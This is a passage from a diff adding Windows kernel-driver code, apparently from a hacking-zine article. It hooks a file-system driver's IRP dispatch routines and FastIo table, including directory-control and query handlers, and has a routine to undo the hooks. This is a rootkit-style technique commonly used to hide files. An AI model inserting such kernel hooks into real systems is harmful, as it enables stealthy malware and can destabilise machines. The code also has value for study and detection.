+                InterceptFunction(IRP_MJ_WRITE, pDriverObject, &OldWriteDisp, NewReadWriteDisp);
+                InterceptFunction(IRP_MJ_QUERY_INFORMATION, pDriverObject, &OldQueryDisp, NewQueryDisp);
+                InterceptFunction(IRP_MJ_SET_INFORMATION, pDriverObject, &OldSetInfoDisp, NewSetInfoDisp);
+                InterceptFunction(IRP_MJ_DIRECTORY_CONTROL, pDriverObject, &OldDirCtlDisp, NewDirCtlDisp);
+                //hook FastIo dispatch functions if FastIo table exists
+                if (pDriverObject->FastIoDispatch)
+                {
+                        //на защиту памяти ядра в w2k [rus]
+                        //It would be better to copy FastIo table to avoid
+                        //messing with kernel memory protection, but it works as it is
+                        OldFastIoReadDisp = pDriverObject->FastIoDispatch->FastIoRead;
+                        pDriverObject->FastIoDispatch->FastIoRead = NewFastIoRead;
+                        OldFastIoWriteDisp = pDriverObject->FastIoDispatch->FastIoWrite;
+                        pDriverObject->FastIoDispatch->FastIoWrite = NewFastIoWrite;
+                        OldFastIoQueryStandartInfoDisp = pDriverObject->FastIoDispatch->FastIoQueryStandardInfo;
+                        pDriverObject->FastIoDispatch->FastIoQueryStandardInfo = NewFastIoQueryStandartInfo;
+                }
+                KeLowerIrql(OldIrql);
+        }
+        
+        return status;
+}
+
+//Function cancels hooking
+VOID UnIntercept()
+{
+        KIRQL OldIrql;
+        if (pDriverObject)
+        {
+                KeRaiseIrql(HIGH_LEVEL, &OldIrql);
+                InterceptFunction(IRP_MJ_READ, pDriverObject, NULL, OldReadDisp);
+                InterceptFunction(IRP_MJ_WRITE, pDriverObject, NULL, OldWriteDisp);
+                InterceptFunction(IRP_MJ_QUERY_INFORMATION, pDriverObject, NULL, OldQueryDisp);
+                InterceptFunction(IRP_MJ_SET_INFORMATION, pDriverObject, NULL, OldSetInfoDisp);
+                InterceptFunction(IRP_MJ_DIRECTORY_CONTROL, pDriverObject, NULL, OldDirCtlDisp);
+                if (pDriverObject->FastIoDispatch)
+                {
+                        pDriverObject->FastIoDispatch->FastIoRead = OldFastIoReadDisp;
+                        pDriverObject->FastIoDispatch->FastIoWrite = OldFastIoWriteDisp;
+                        pDriverObject->FastIoDispatch->FastIoQueryStandardInfo = OldFastIoQueryStandartInfoDisp;
+                }
+                KeLowerIrql(OldIrql);
+                ObDereferenceObject(pDriverObject);
+        }
+}
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
